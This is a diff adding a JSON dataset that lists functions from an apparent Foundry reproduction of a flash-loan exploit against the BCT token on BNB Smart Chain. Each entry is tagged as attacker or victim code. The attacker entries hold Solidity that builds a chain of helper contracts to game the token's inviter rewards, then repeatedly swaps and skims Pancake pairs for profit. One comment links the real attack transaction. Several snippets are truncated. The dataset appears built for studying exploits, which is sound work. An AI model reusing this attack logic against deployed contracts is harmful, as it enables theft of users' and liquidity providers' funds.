@@ -1,0 +1,135 @@
+[
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "init",
+    "original_code": "    function init() public {\n        address[] memory tools = new address[](5);\n\n        // create 5 tools for the following attack\n        for (uint256 i = 0; i < 5; i++) {\n            Tool tool = new Tool();\n            tools[i] = address(tool);\n        }\n\n        address first = tools[0];\n\n        address[] memory path = new address[](2);\n        path[0] = wbnb;\n        path[1] = bct;\n        // msg.value share to 5 addresses\n        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.00015 ether}(\n            1_000_000_000_000_000, path, address(this), 99_999_999_999_999_999_999_999_999\n        );\n        IERC20(bct).transfer(first, 1_000_000_000_000_000);\n        IInviter(first).f_0x4e515153(bct, address(this), 500_000_000_000_000);\n        uint256 i = 0;\n        while (i < 5) {\n            uint256 k = 4;\n            if (i < k) {\n                address current_tool = tools[i];\n                address next_tool = tools[i + 1];\n                router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.00015 ether}(\n                    1_000_000_000_000_000, path, current_tool, 99_999_999_999_999_999_999_999_999\n                );\n                IInviter(current_tool).f_0x4e515153(bct, next_tool, 1_000_000_000_000_000);\n                IInviter(next_tool).f_0x4e515153(bct, current_tool, 500_000_000_000_000);\n            }\n            i++;\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "pancakeCall",
+    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        // address inviter = 0xe9616ff20ad519Bce0e3D61353a37232F0c27A50; // the attacker contract\n        address inviter = address(this);\n        uint256 index = 0;\n        address[] memory inviters = new address[](5);\n        while (index < 5) {\n            address inviter_ = IBCT(bct).inviter(inviter);\n            inviters[index] = inviter_;\n            inviter = inviter_;\n            index++;\n\n            uint256 amount = IERC20(bct).balanceOf(inviter_);\n        }\n        index = 0;\n        while (index < 5) {\n            (uint112 reserve0, uint112 reserve1, uint32 timestamp) = IPancakePair(pancakepair).getReserves();\n\n            uint256 buyAmount = calculateValue(reserve1, reserve0, 60e18);\n\n            Wbnb.transfer(inviters[index], buyAmount);\n            // vm.prank(address(this), 0x9c66B0c68c144Ffe33E7084FE8cE36EBC44aD21e);\n            IInviter(inviters[index]).buy(wbnb, pancakepair, buyAmount);\n            index++;\n        }\n\n        index = 0;\n        while (index < 10) {\n            uint256 balance = Wbnb.balanceOf(address(this));\n            (uint112 reserve0, uint112 reserve1, uint32 timestamp) = IPancakePair(pancakepair).getReserves();\n            uint256 amount = calculate(reserve1, reserve0, balance);\n\n            Wbnb.transfer(pancakepair, balance);\n            IPancakePair(pancakepair).swap(amount, 0, cake_lp, \"\");\n            IPancakePair(cake_lp).skim(address(this));\n\n            while (true) {\n                uint256 bct_balance = IERC20(bct).balanceOf(address(this));\n                if (bct_balance > 1e18) {\n                    IERC20(bct).transfer(cake_lp, bct_balance);\n                    IPancakePair(cake_lp).skim(address(this));\n                } else {\n                    process(30e18, inviters);\n                    index++;\n                    break;\n                }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 34_204_710 - 1);\n        deal(address(this), 0.1 ether);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "BCT",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        uint256 before = Wbnb.balanceOf(address(this));\n        init(); // simulate the first tx for preparation\n        // attack begin\n        PancakePair.swap(20_000_000_000_000_000_000, 0, address(this), abi.encode(\"0x20\"));\n        emit log_named_decimal_uint(\n            \"[End] After repay, Profit: BNB balance of attacker\", Wbnb.balanceOf(address(this)) - before, 18\n        );\n    }\n\n    // simulate the preparation of the attack, tx: https://bscscan.com/tx/0xd4c19d575ea5b3a415cc288ce09942299ca3a3b49ef9718cda17e4033dd4c250\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Tool",
+    "source_type": "victim_contract",
+    "function_name": "buy",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Tool",
+    "source_type": "victim_contract",
+    "function_name": "f_0x4e515153",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Tool",
+    "source_type": "victim_contract",
+    "function_name": "f_0xf986351d",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IBCT",
+    "source_type": "victim_contract",
+    "function_name": "inviter",
+    "original_code": "",
+    "description": ""
+  }
+]
